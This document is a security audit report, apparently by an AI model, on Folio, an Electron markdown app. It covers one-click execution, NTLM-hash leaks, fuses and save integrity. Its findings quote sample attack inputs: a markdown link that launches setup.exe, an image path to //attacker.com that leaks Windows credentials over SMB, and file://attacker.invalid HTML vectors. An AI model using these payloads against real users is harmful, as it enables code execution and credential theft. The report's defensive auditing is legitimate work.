# Security Audit Report: Folio

**Date:** 17 October 2026 · **Auditor:** Claude (code review + security audit) · **Scope:** the whole codebase (Electron main process, preload, renderer, build config, dependencies)
**Stack:** Electron 44 · Vite 8 · Tiptap 3 · markdown-it 14 · DOMPurify 3 · mermaid 12 · electron-builder 26 (NSIS, Windows x64)
**Version audited:** Folio 1.0.0 (`Folio-source.zip`)

## 1. Executive summary

Folio's foundation is solid. The renderer runs sandboxed with context isolation and no Node access, rendered markdown is sanitized with DOMPurify, Mermaid runs in strict mode, and web links open in the browser instead of inside the app. The weak spot was the links and images *inside* documents. A markdown file someone sends you could **run a program with one click**, because a link to `setup.exe` was passed straight to Windows. It could also make Windows **connect to an outside server the moment the file opened**, through an image path like `//server/share/x.png`, which can leak your Windows login hash. Both problems are fixed, along with several smaller hardening gaps. I also fixed a real bug in the Read toolbar (most of its buttons did nothing). Every fix was checked by running the app against booby-trapped test files, before and after.

**Security score:** 14/100 → **89/100** after fixes
(Start at 100: −25 per open CRITICAL, −15 per HIGH, −7 per MEDIUM, −2 per LOW. The "after" score only counts what is still open.)

**Verdict:** ⚠️ **Safe to install and use yourself. Ready to share, with one accepted risk:** the installer isn't code-signed, so people will see a Windows SmartScreen warning and can't easily tell your build from a tampered copy. See F-8.

## 2. Findings summary

| # | Severity | Finding | Location (original) | Status |
|---|---|---|---|---|
| F-1 | CRITICAL | One-click code execution: document links to `.exe`/`.bat`/`.lnk`/… are launched | `electron/main.cjs:368`, `src/main.js:411-412` | FIXED |
| F-2 | HIGH | Zero-click Windows credential (NTLM hash) leak through UNC image/link paths | `src/util.js:57-59`, `src/reader.js:63-69`, `src/editor.js:35-38`, `electron/main.cjs:156-165` | FIXED |
| F-3 | MEDIUM | `folio://` protocol served *any* file on disk, with `bypassCSP` | `electron/main.cjs:19, 156-165` | FIXED |
| F-4 | MEDIUM | Electron fuses not set (RunAsNode, NODE_OPTIONS, inspector on; no ASAR integrity check) | `package.json` build config | FIXED |
| F-5 | MEDIUM | Quitting during a save could leave a half-written or empty file | `electron/main.cjs:126-133, 323` | FIXED |
| F-6 | LOW | DevTools could be opened in the shipped app (Ctrl+Shift+F12) | `electron/main.cjs:119-123` | FIXED |
| F-7 | LOW | Lightbox built HTML from an image URL with `innerHTML` | `src/reader.js:100` | FIXED |
| F-8 | MEDIUM | Installer is not code-signed | `package.json` (`signAndEditExecutable: false`) | ACCEPTED (needs a certificate) |
| F-9 | LOW | KaTeX advisory GHSA-238p-pmpm-9mq7 (copy nested inside the math plugin) | `@vscode/markdown-it-katex` → `katex@0.16.47` | FIXED |
| F-10 | LOW | CSP had no `object-src`/`frame-src`/`base-uri`/`form-action` limits | `index.html:5` | FIXED |
| F-11 | LOW | Image import accepted any file extension | `electron/main.cjs:352` | FIXED |
| F-12 | LOW | `settings:set` accepted `__proto__` keys; no size limit when opening files | `electron/main.cjs:276-277, 317-318` | FIXED |
| F-13 | LOW | Exported HTML pointed to `folio://` images (broken outside Folio) and had no CSP | `src/main.js:730-735` | FIXED |
| F-14 | LOW | Remote web images in a document load automatically (they show the sender that you opened it, plus your IP) | `index.html` CSP `img-src https: http:` | OPEN (feature trade-off) |
| F-15 | LOW | App loads from `file://`, so the "file protocol extra privileges" fuse can't be turned off | `electron/main.cjs:94` | OPEN (needs a custom `app://` protocol) |
| F-16 | INFO | 8 moderate npm advisories, all in **build-time** tools (electron-builder → sprintf-js DoS); nothing ships in the app | `node_modules` | NOTED |
| F-17 | INFO | Electron 44.8.0 → 44.9.0 (released 17 Oct 2026, Chromium security fixes) | `package.json` | UPDATED |
| BUG | — | Read toolbar: Outline, text size, Wide, Find, Copy and Export buttons did nothing | `src/main.js:683` | FIXED |

Totals: 1 CRITICAL, 1 HIGH, 4 MEDIUM, 9 LOW, 2 INFO. 13 fixed, 1 accepted, 2 open (low), plus 1 functional bug fixed.

## 3. Detailed findings

### F-1: One-click code execution from a document link (CRITICAL, FIXED)
- **Attack scenario:** Someone sends you a zip with `Report.md` and `setup.exe`. The page says "[Open the full report](setup.exe)". You click it in Folio and Windows runs `setup.exe` with no warning. The same works with `.bat`, `.lnk`, `.hta`, `.vbs`, `.js`, `.msi`, `.scr`, macro-enabled Office files and paths like `../../Windows/System32/…`.
- **Root cause:** `openLink()` passed any existing non-markdown path to `shell.openPath`, which is the same as double-clicking the file in Explorer.
- **Fix applied:** The `shell:openPath` handler in the main process now decides, so a bug in the page can't skip it:
  - Programs, scripts, shortcuts, installers and macro files (about 80 extensions, trailing dots/spaces stripped) are **never run**. Folio shows "Folio won't run '…' from a link" with a *Show in folder* option.
  - Safe document/media types (PDF, images, txt/csv, docx/xlsx/pptx, audio/video…) open as before.
  - Anything else asks first (*Cancel / Open / Show in folder*, with Cancel as the default).
  - Network paths and alternate data streams (`file.txt:evil.exe`) are refused.
- **Verification:** I ran it against the PoC file. Before the fix, Folio called `shell.openPath(setup.exe)`. After, `setup.exe` and `run.bat` are blocked with the warning, `data.zip` asks first, and `report.pdf` opens.
- **Regression test:** `tests/security.test.cjs` covers links that would launch programs, the blocked-program warning, the confirmation step and safe documents opening.

### F-2: Zero-click NTLM hash leak through UNC paths (HIGH, FIXED)
- **Attack scenario:** A document contains `![chart](//attacker.com/share/chart.png)`. As soon as you open it, Folio asks Windows to load `\\attacker.com\share\chart.png` over SMB, and Windows sends your account's NTLMv2 hash to try to log in. That hash can be cracked offline or relayed. You don't have to click anything. A link to `//attacker/share/x.md` did the same thing on click.
- **Root cause:** Paths starting with `//` or `\\` counted as "absolute local paths", went into `folio://`, and from there to `net.fetch(file://attacker.com/…)`.
- **Fix applied:** `isRemotePath`, `shareRoot` and `trustShareOf` in `main.cjs`. The `folio://` protocol, `fs:exists` and `shell:openPath` refuse network paths, **unless that network share is one you opened yourself** (through the Open dialog, drag and drop, a recent file or the command line). Notes kept on a NAS keep working.
- **Verification:** UNC images now come back 403 and show as broken images, and UNC links are not followed. Unit-tested against `//host/share`, `\\host\share`, `\\?\UNC\…` and `\\.\pipe\…`, with and without a trusted share.
- **Regression test:** covered by the UNC checks in `tests/security.test.cjs`. On Windows they confirm the share is never contacted.

### F-3: `folio://` could read any file on disk (MEDIUM, FIXED)
- **Attack scenario:** This one is defense in depth. If any future bug let a page run script, `folio://local/C:/Users/you/...` would hand over any file (SSH keys, browser data, documents). It also served HTML that could run inside a frame, and `bypassCSP` switched off the CSP for it.
- **Fix applied:** The protocol now serves **image types only**, refuses network paths, sends `nosniff`, puts SVGs under a no-script CSP, and no longer has `bypassCSP`.
- **Verification:** A local `.png` loads. `.txt` and `.html` are refused (403).

### F-4: Electron fuses (MEDIUM, FIXED)
- **Attack scenario:** With the defaults, any program on the PC can run `Folio.exe` as a general-purpose Node.js runtime (`ELECTRON_RUN_AS_NODE`) or inject code through `NODE_OPTIONS` or `--inspect`. Malware uses tricks like this to hide behind an app the user trusts. Without an integrity check, someone could also swap `app.asar` in your install folder without anyone noticing.
- **Fix applied:** I added `build.electronFuses` to `package.json`: RunAsNode off, NODE_OPTIONS off, inspector arguments off, only load the app from the ASAR archive, ASAR integrity check on, cookie encryption on.
- **Verification:** I built `release/win-unpacked` and read the fuses back from `Folio.exe` with `@electron/fuses`. The integrity resource is there, its SHA-256 matches `app.asar`, and your icon and version info (written by `afterPack`) survived.
- **⚠ If the installed app ever refuses to start on Windows,** set `"enableEmbeddedAsarIntegrityValidation": false` in `package.json` and rebuild. I verified the hash but couldn't run the `.exe` on real Windows from here.

### F-5: Quitting mid-save could truncate a file (MEDIUM, FIXED)
- **Scenario:** The close handler waits at most 2.5 seconds and then quits. `fs.writeFile` empties the file before writing it, so if the app quits during a slow write (big file, OneDrive, a network drive), the note can end up empty.
- **Fix applied:** Every write goes through `track()`, and `will-quit` waits for writes that are still running.

### F-6: DevTools in the shipped app (LOW, FIXED)
Ctrl+Shift+F12 opened DevTools in the installed app. DevTools has full access to `window.folio`, so a "paste this in the console" scam could make it run files. DevTools now only works in development builds, and `<webview>` is blocked.

### F-7: Lightbox `innerHTML` (LOW, FIXED)
`lb.innerHTML = '<img src="' + img.src + '">'` read a URL as HTML. DOMPurify currently stops the quote-breaking data URL I tried, so it wasn't exploitable. It is now built with DOM methods so it never depends on that.

### F-8: Unsigned installer (MEDIUM, ACCEPTED)
People who download `Folio-Setup.exe` get a SmartScreen "Windows protected your PC" warning and have no way to check that the file came from you and wasn't changed. Before sharing widely, see roadmap item 1. Until then, share the SHA-256 hash of the installer (`Get-FileHash Folio-Setup-1.0.0.exe`) alongside the download.

### F-9 to F-13: small hardening (LOW, FIXED)
- **F-9:** I added an npm `overrides` entry so the math plugin uses the patched `katex@0.19.0`.
- **F-10:** The CSP now includes `object-src 'none'; frame-src 'none'; worker-src 'none'; base-uri 'none'; form-action 'none'`. Mermaid, KaTeX and the editor were all tested with it.
- **F-11:** Image import only accepts image extensions.
- **F-12:** Settings ignore `__proto__`/`constructor` keys. Files over 50 MB show an error instead of freezing the app.
- **F-13:** Exported HTML now uses the original relative image paths (so images show up in a browser) and carries a strict CSP.

### F-14: Remote images in a document (LOW, OPEN)
Web images (`https://…`) load as soon as a page opens. A sender can use this as a "read receipt" and see your IP address. It's normal behaviour for a markdown viewer, so I didn't change it. If you want, add a setting like "Load remote images: always / ask / never".

### F-15: `file://` privileges fuse (LOW, OPEN)
I tested turning off `GrantFileProtocolExtraPrivileges`, and it stops the app from loading at all (its module scripts come from `file://`), so it stays on. Serving the UI from a custom `app://` protocol would let you turn it off later. Low priority.

### BUG: Read toolbar buttons did nothing (FIXED)
`e.target.closest('[data-font]')` matched `<html data-font="sans">`, so **every** Read-toolbar click counted as a font change and returned early. Outline, A−/A+, Wide, Find, Copy as Markdown and Export/Print never worked by mouse (keyboard shortcuts did). Fixed with `button[data-font]`. The same pattern was hardened on the mode switch (`#app` has `data-mode`).

## 4. Checklist results (adapted to a local desktop app)

| Area | Result |
|---|---|
| Authentication / sessions / CSRF / DB / rate limiting | N/A (no accounts, no server, no network API) |
| Input validation and injection (untrusted markdown) | ❌ → ✅ (F-1, F-2, F-11, F-12) |
| Output encoding and XSS | ✅ DOMPurify on all rendered markdown, Mermaid strict, KaTeX trust off, `escapeHtml` everywhere else; ⚠️ → ✅ F-7 |
| Electron security checklist (isolation, sandbox, nodeIntegration, navigation, window.open, webview, permissions, protocol) | ⚠️ → ✅ (F-3, F-6; permission requests now denied except clipboard write) |
| Secrets and configuration | ✅ No API keys, tokens or secrets anywhere in the code |
| Security headers / CSP | ⚠️ → ✅ (F-10) |
| Dependencies and supply chain | ⚠️ → ✅ shipped code; build-tool advisories noted (F-16); lockfile committed |
| Binary hardening / distribution | ❌ → ⚠️ fuses on (F-4); signing open (F-8) |
| Privacy | ✅ No telemetry, no cloud, files stay on disk; ⚠️ remote images (F-14) |
| Data integrity | ⚠️ → ✅ (F-5); loss-free save design confirmed (opening a file never changes its bytes) |

## 5. What this audit did NOT cover

This was a code review plus automated tests in a Linux sandbox. It wasn't a live penetration test. I built the Windows package and inspected `Folio.exe`, but I couldn't run it on real Windows, so the UNC/SMB behaviour was verified through the path logic rather than a real SMB server. Third-party libraries (Tiptap, mermaid, markdown-it, DOMPurify) were checked against known advisories, not audited line by line. Advisories are as of 17 Oct 2026.

## 6. Hardening roadmap

1. **Code-sign the installer (M).** Removes the SmartScreen warning and proves the file came from you. The cheapest option is Azure Trusted Signing, which electron-builder supports via `win.azureSignOptions`. An OV certificate from a CA also works.
2. **Run `tests/security.test.cjs` before every release (S).** Every line must say PASS.
3. **Keep Electron current (S).** Electron ships Chromium security fixes often. Rebuild when a new 44.x patch comes out, and plan the move to 45 once it's stable.
4. **If you add auto-update (`electron-updater`), only ship it with signed builds (M).** An unsigned auto-updater is a remote-code-execution channel.
5. **Optional "remote images" setting (S).** Closes F-14.
6. **Optional `app://` protocol for the UI (M).** Lets you turn off the last fuse (F-15).
7. **Turn on Dependabot (S)** if this goes on GitHub (free).

## 7. Secrets rotation notice

No exposed secrets found. Nothing to rotate.

## Appendix: files changed

- `electron/main.cjs`: link safety (open-path policy, UNC/share trust), image-only `folio://` without `bypassCSP`, permission handler, DevTools gated to dev builds, `<webview>` blocked, write tracking on quit, read size cap, image extension check, settings key filter, test script path resolved.
- `src/reader.js`: lightbox built with DOM methods; original image path kept for export.
- `src/main.js`: Read toolbar and mode switch selector fix; HTML export with relative images and CSP.
- `index.html`: stricter CSP.
- `package.json` / `package-lock.json`: Electron 44.9.0, KaTeX override, Electron fuses.
- `tests/security.test.cjs` (new): security regression test (11 checks).
- `CLAUDE.md`: "Security rules" section so future changes keep these protections.
- `SECURITY-AUDIT.md` (new): this report.

## Addendum (second review, 17 October 2026): F-2 was only partly fixed

**What was missing:** the F-2 fix covered markdown images (`![](//server/share/x.png)`) and links, because those go through `folio://` and `fs:exists`. But a document can also reference a network share through raw HTML that Chromium loads directly, without going through `folio://`: `srcset`, `<picture><source>`, `<video src/poster>`, `<audio>`, `style="background:url(//…)"`, `<svg><image href>` and `<input type="image">`. DOMPurify keeps all of these (they're normal HTML), and the CSP's `'self'` allows `file:` URLs because the app itself loads from `file://`. So 7 of these 8 still produced `file://attacker/share/…` requests the moment the page opened. On Windows that is the same zero-click SMB/NTLM leak. (`srcset` only fires on high-DPI screens.)

**How it was confirmed:** a probe document with all 8 forms, with every request logged through `webRequest`. Before the fix, 7 requests went to `file://attacker.invalid/…`. After the fix, all of them end with `net::ERR_BLOCKED_BY_CLIENT`.

**Fix:** a single `session.defaultSession.webRequest.onBeforeRequest` filter in `main.cjs` cancels every `file:` request whose host is another machine (or whose path starts with `//`), unless it's on a share the user opened (`remoteAllowed`). This sits below every HTML attribute, so new or forgotten vectors are covered too. Notes on a NAS the user opened still work.

**Regression test:** `tests/security.test.cjs` now includes all these forms and a 12th check, "no HTML attribute can reach a network share". It fails on the previous version and passes now.

**Status:** F-2 FIXED (complete). Score unchanged at 89/100, but the earlier "FIXED" for F-2 was premature until this addendum.
